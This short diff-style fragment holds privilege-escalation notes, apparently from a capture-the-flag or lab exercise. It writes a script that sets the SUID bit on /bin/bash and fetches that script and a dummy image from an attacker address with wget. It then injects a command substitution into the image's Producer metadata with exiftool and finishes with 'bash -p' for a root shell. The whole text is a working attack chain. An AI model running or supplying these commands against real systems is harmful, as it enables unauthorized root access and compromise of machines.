@@ -1,0 +1,9 @@
+echo -e '#!/bin/bash\nchmod u+s /bin/bash' > root.sh - This will be the PE /bin/bash script which enables /usr/bin/bash to have SUID
+
+wget http://10.10.14.4/root.sh
+
+wget http://10.10.14.4/img.png - To get a dummy file
+
+exiftool -Producer='a[$(/tmp/root.sh>&2)]+42' img.png
+
+bash -p
